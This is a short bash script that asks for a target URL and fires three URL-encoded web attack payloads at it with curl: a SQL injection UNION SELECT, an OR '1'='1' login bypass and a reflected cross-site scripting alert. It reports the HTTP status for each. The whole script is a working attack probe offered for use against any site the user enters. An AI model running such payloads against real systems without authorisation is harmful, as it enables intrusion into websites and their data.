#!/bin/bash


read -p "enter a  tagert " base_url


webatt(){

local TARGET=$1

payload=(
    "%27%20UNION%20SELECT%201,2--"

    "%27%20OR%20%271%27=%271"

    "%3Cscript%3Ealert(1)%3C/script%3E"
)



for pay in "${payload[@]}"; do

echo "payload sent :: $pay"

res=$(curl -s -w "STATUS : %{http_code}" -g "${TARGET}${pay}" -o /dev/null)

echo "response is : $res"

done

}

webatt "$base_url"
